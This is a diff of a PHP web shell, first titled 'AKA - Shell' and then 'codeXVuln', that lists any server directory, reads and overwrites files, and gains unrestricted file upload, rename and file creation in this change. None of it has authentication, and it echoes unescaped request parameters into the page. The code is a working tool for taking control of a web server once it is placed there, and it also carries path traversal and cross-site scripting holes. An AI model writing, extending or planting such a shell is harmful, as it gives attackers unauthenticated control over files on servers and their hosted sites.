@@ -1,21 +1,41 @@
 <?php
 
-$dir = ".";
+$dir = "./";
 if(@$_GET['dir']){
-
     $dir = $_GET['dir'];
 }
-
+// print_r(@$_POST);
 
 if(@$_POST['action']){
     if($_POST['action'] == 'setFile'){
         setFile($_POST['path'], $_POST['text']);
+    }
+    if($_POST['action'] == 'setRename'){
+        setRename($GLOBALS['dir'], $_POST['file'], $_POST['fileNew']);
+    }
+    if($_POST['action'] == 'Upload'){
+	
+        upload();
     }
 }
 
 if(@$_GET['action']){
     if($_GET['action'] == 'newFolder'){
         createFolder($GLOBALS['dir'], 'New Folder');
+    }
+    if($_GET['action'] == 'newFile'){
+        createFile($GLOBALS['dir'], 'NewFile.txt');
+    }
+}
+
+function upload(){
+	$path = $GLOBALS['dir'] .'/'. basename( $_FILES['file']['name']);
+	print_r($path);
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['file']['name']). 
+      " has been uploaded";
+    } else{
+        echo "There was an error uploading the file, please try again!";
     }
 }
 
@@ -43,6 +63,10 @@ function setFile($path, $text){
     file_put_contents($path, $text);
 }
 
+function setRename($path, $file, $fileNew){
+	rename ($path."/".$file, $path."/".$fileNew);
+}
+
 function createFolder($path, $name){
     
     if(!is_dir($path.'/'.$name)){
@@ -56,12 +80,25 @@ function createFolder($path, $name){
 }
 
 function createFile($path, $name){
-
+	file_put_contents($path.'/'.$name, '');
 }
 
-// createFolder($dir, 'tes');
-echo getcwd();
-print_r(fileperms(getcwd()));
+function urutDirectory($path, $array){
+	$tempDir = array();
+	$tempFile = array();
+	asort($array);
+	foreach ($array as $row) {
+		$temp = $path."/".$row;
+	    if(is_dir($temp)){
+	    	array_push($tempDir, $row);
+	    }else{
+	    	array_push($tempFile, $row);
+	    }
+	}
+	return array_merge($tempDir, $tempFile);
+}
+
+
 ?>
 
 <!DOCTYPE html>
@@ -70,7 +107,7 @@ print_r(fileperms(getcwd()));
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>AKA - Shell</title>
+    <title>codeXVuln</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
     <style>
     
@@ -86,6 +123,10 @@ print_r(fileperms(getcwd()));
         padding: 7px;
     }
 
+    .my-table tr:hover{
+    	background-color: #333333;
+    }
+
     a {
         color: white;
     }
@@ -96,6 +137,10 @@ print_r(fileperms(getcwd()));
 
     textarea{
         background-color: #1e1e1e;
+    }
+
+    input{
+    	background-color: #1e1e1e;
     }
 
     .my-container{
@@ -109,7 +154,7 @@ print_r(fileperms(getcwd()));
 
     <div class="my-container">
 
-        <h3>My Shell</h3>
+        <h3>codeXVuln</h3>
         <br>
 
         <table style="border: 0px solid white">
@@ -126,8 +171,11 @@ print_r(fileperms(getcwd()));
 
         </table>
         <hr>
-        <form action="">
-            <input type="file" name="file">
+        <form action="?dir=<?=$dir?>" method="post" enctype="multipart/form-data">
+	        <div class="row">
+	        	<input class="col-sm-2" type="file" name="file">
+	        	<input type="submit" name="action" value="Upload">
+	        </div>
         </form>
         <br>
         <table style="width:100%" class="my-table">
@@ -144,24 +192,28 @@ print_r(fileperms(getcwd()));
             </thead>
             <tbody>
             <?php 
-            
             $dataDir = scandir($dir);
-            uksort($dataDir, 'strcasecmp');
+            $dataDir = urutDirectory($dir, $dataDir);
             foreach($dataDir as $entry){
+            	$tempFile = $dir."/".$entry;
             ?>
                 <tr>
-                    <td><?=is_dir($dir."/".$entry)?"<a href='?dir=$dir/$entry'>$entry</a><br>":$entry?></td>
-                    <td><?=is_dir($dir."/".$entry)?'dir':'file'?></td>
-                    <td></td>
-                    <td><?=date ("F d Y H:i:s.", filemtime($dir."/".$entry))?></td>
-                    <td><?=fileowner($dir."/".$entry)."/".filegroup($dir."/".$entry)?></td>
-                    <td><?=fileperms($dir."/".$entry)?></td>
+                    <td><?=is_dir($tempFile)?" <a href='?dir=$dir/$entry'> <span class='glyphicon glyphicon-folder-open' style='color:#FFDD33'></span> $entry</a><br>":'<span class="glyphicon glyphicon-file" style="color:#CCCCCC"></span> '.$entry?></td>
+                    <td><?=is_dir($tempFile)?'dir':'file'?></td>
+                    <td><?=!is_dir($tempFile)?filesize($tempFile):''?></td>
+                    <td><?=date("F d Y H:i:s.", filemtime($tempFile))?></td>
+                    <td><?=fileowner($tempFile)."/".filegroup($tempFile)?></td>
+                    <td><?=fileperms($tempFile)?></td>
                     <td>
-                        <?php if(!is_dir($dir."/".$entry)){?>
-                        <a href="?dir=<?=$dir?>&edit=<?=$dir."/".$entry?>" class="glyphicon glyphicon-edit"></a> | 
-                        <a href="?dir=<?=$dir?>&view=<?=$dir."/".$entry?>" class="glyphicon glyphicon-search"></a>
+                        <?php if(!is_dir($tempFile)){?>
+                        <a href="?dir=<?=$dir?>&edit=<?=$tempFile?>" class="glyphicon glyphicon-edit"></a> | 
+                        <a href="?dir=<?=$dir?>&view=<?=$tempFile?>" class="glyphicon glyphicon-search"></a> | 
                         <?php }else if($entry == '..' || $entry == '.'){ ?>
                         <a href="?dir=<?=$dir?>&action=newFolder" > New Folder</a> | 
+                        <a href="?dir=<?=$dir?>&action=newFile" > New File</a> | 
+                        <?php } 
+                        if($entry != '.' && $entry != '..'){ ?>
+                        <a href="?dir=<?=$dir?>&rename=<?=$entry?>"> rename</a>
                         <?php } ?>
                     </td>
                 </tr>
@@ -172,6 +224,16 @@ print_r(fileperms(getcwd()));
         </table>
         <hr>
         <?php
+        if(@$_GET['rename']){
+        ?>
+        <form method="POST" action="?dir=<?=$dir?>">
+        	<input type="hidden" name="file" value="<?=$_GET['rename']?>" />
+        	<input type="text" name="fileNew" value="<?=$_GET['rename']?>" />
+        	<input type="submit" name="action" value="setRename" />
+        	
+        </form>
+        <?php
+        }
         if(@$_GET['edit']){
 
             edit($_GET['edit']);
@@ -181,6 +243,5 @@ print_r(fileperms(getcwd()));
         }
         ?>
     </div>
-
 </body>
 </html>
